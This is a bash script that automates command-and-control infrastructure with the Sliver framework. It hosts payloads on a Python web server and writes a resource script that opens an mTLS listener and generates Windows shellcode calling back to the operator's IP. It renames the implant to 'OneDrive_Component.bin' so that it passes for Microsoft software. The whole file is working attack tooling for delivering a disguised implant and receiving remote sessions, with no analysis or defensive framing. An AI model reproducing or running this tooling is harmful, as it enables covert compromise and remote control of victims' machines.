#!/bin/bash

# --- SETUP
LHOST="192.168.122.235"     # enter your Kali's IP here
LPORT="8443"                # reverse shell port
WEB_PORT="8080"             # python Web Server port
PAYLOAD_NAME="OneDrive_Component.bin"

# flag parsing
SKIP_GEN=false
for arg in "$@"; do
    if [ "$arg" == "--skip-generation" ]; then
        SKIP_GEN=true
    fi
done

# get script's absolute directory
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
WWW_DIR="$DIR/www"
RC_FILE="$DIR/sliver_commands.rc"

# create www dir if not exist
mkdir -p "$WWW_DIR"

echo -e "\e[1;34m[*]=========================================\e[0m"
echo -e "\e[1;34m[*] Launching Automated C2 Infrastructure   \e[0m"
echo -e "\e[1;34m[*]=========================================\e[0m"

# 1. START PYTHON WEB SERVER
echo -e "\e[1;33m[*] 2. Starting Python Web Server on port $WEB_PORT...\e[0m"
cd "$WWW_DIR"
python3 -m http.server $WEB_PORT &
PYTHON_PID=$!  # save server PID
echo -e "\e[1;32m[+] Web Server listening on http://$LHOST:$WEB_PORT\e[0m"
cd "$DIR"

# 2. CREATE SLIVER RC SCRIPT
echo -e "\e[1;33m[*] 1. Creating Sliver Resource Script...\e[0m"
if [ "$SKIP_GEN" = true ]; then
    echo "[!] --skip-generation flag detected. Skipping shellcode creation."
    cat << EOF > "$RC_FILE"
mtls -L $LHOST -l $LPORT
EOF
else
    cat << EOF > "$RC_FILE"
mtls -L $LHOST -l $LPORT
generate --mtls $LHOST:$LPORT --os windows --arch amd64 --format shellcode --save $WWW_DIR
EOF
fi
echo -e "\e[1;32m[+] Resource script generated: $RC_FILE\e[0m"

# 3. RENAME THE GENERATED PAYLOAD BEFORE LAUNCHING INTERACTIVE CONSOLE
if [ "$SKIP_GEN" = false ]; then
    echo -e "\e[1;33m[*] Generating and preparing payload file...\e[0m"
    sliver-server --rc "$RC_FILE" > /dev/null 2>&1
    
    LATEST_PAYLOAD=$(ls -t "$WWW_DIR"/*.bin 2>/dev/null | head -n 1)
    if [ -n "$LATEST_PAYLOAD" ] && [ "$(basename "$LATEST_PAYLOAD")" != "$PAYLOAD_NAME" ]; then
        mv "$LATEST_PAYLOAD" "$WWW_DIR/$PAYLOAD_NAME"
        echo -e "\e[1;32m[+] Latest generated payload renamed to: $WWW_DIR/$PAYLOAD_NAME\e[0m"
    fi
fi

# 4. LAUNCH INTERACTIVE SLIVER WITH RC SCRIPT
echo -e "\e[1;33m[*] 3. Launching Sliver Client and executing commands...\e[0m"
echo -e "\e[1;31m[!] Type 'exit' inside the sliver console to shut down the infrastructure.\e[0m"
cd "$DIR"

sliver-server --rc "$RC_FILE"

# CLEANUP
echo -e "\e[1;34m[*] Shutting down the infrastructure...\e[0m"
echo -e "\e[1;33m[*] Terminating Python Web Server (PID: $PYTHON_PID)...\e[0m"
kill $PYTHON_PID 2>/dev/null
rm -f "$RC_FILE"
echo -e "\e[1;32m[+] Operation completed. Goodbye!\e[0m"